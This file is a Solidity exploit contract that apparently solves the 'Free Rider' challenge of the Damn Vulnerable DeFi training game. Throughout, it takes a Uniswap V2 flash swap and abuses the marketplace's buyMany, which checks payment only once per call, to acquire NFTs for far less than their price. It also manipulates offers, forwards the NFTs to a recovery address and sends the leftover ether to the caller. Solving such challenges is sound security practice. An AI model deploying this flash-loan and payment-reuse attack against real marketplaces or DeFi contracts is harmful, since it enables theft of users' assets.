// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";

contract FreeRiderNFTMarketplaceExp is IUniswapV2Callee, IERC721Receiver {
    IWETH public immutable weth;
    FreeRiderNFTMarketplace public immutable target;
    DamnValuableNFT public immutable token;
    address public immutable recovery;
    IUniswapV2Pair pair;
    uint256 step;

    constructor(
        IWETH _weth,
        FreeRiderNFTMarketplace _target,
        DamnValuableNFT _token,
        address _recovery,
        IUniswapV2Pair _pair
    ) {
        weth = _weth;
        target = _target;
        token = _token;
        recovery = _recovery;
        pair = _pair;
        token.setApprovalForAll(address(target), true);
    }

    receive() external payable {}

    function step1() public {
        step = 1;
        if (pair.token0() == address(weth)) {
            pair.swap(15 ether, 0, address(this), new bytes(1));
        } else {
            pair.swap(0, 15 ether, address(this), new bytes(1));
        }
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        uint256 amt = amount0 + amount1;
        weth.withdraw(amt);

        if (step == 1) {
            for (uint i = 0; i < 6; i++) {
                if (i == 0) {
                    uint256[] memory tokenIds = new uint256[](6);
                    tokenIds[0] = i;
                    tokenIds[1] = i;
                    tokenIds[2] = i;
                    tokenIds[3] = i;
                    tokenIds[4] = i;
                    tokenIds[5] = i;
                    target.buyMany{value: 15 ether}(tokenIds);
                }
            }
        } else {
            uint256[] memory tokenIds = new uint256[](6);
            for (uint i = 0; i < 6; i++) {
                tokenIds[i] = i;
            }
            target.buyMany{value: 75.001 ether}(tokenIds);

            for (uint i = 0; i < 6; i++) {
                token.safeTransferFrom(
                    address(this),
                    address(recovery),
                    i,
                    abi.encode(address(this))
                );
            }
        }

        uint256 repay = amt + (amt * 32) / 10000;
        weth.deposit{value: repay}();
        weth.transfer(msg.sender, repay);
    }

    function step2() public {
        uint256[] memory tokenIds = new uint256[](6);
        uint256[] memory prices = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = 0;
            prices[i] = 0.001 ether;
        }
        target.offerMany(tokenIds, prices);
    }

    function step3() public {
        step = 0;
        if (pair.token0() == address(weth)) {
            pair.swap(15 ether, 0, address(this), new bytes(1));
        } else {
            pair.swap(0, 15 ether, address(this), new bytes(1));
        }
        payable(tx.origin).transfer(address(this).balance);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
